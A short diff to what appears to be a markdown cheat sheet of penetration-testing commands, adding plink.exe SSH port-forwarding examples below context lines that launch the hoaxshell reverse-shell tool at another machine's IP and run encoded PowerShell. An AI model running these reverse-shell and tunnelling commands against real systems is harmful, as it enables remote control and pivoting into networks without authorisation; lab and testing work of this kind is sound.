@@ -109,3 +109,12 @@ python hoaxshell.py -s other's machine IP -p 9999
 ```
 powershell -e
 ```
+
+```
+plink.exe -ssh -L <local_port>:<destination_host>:<destination_port> <username>@<ssh_server>
+```
+
+```
+plink.exe -ssh -L 8080:localhost:80 user@ssh_server
+```
+
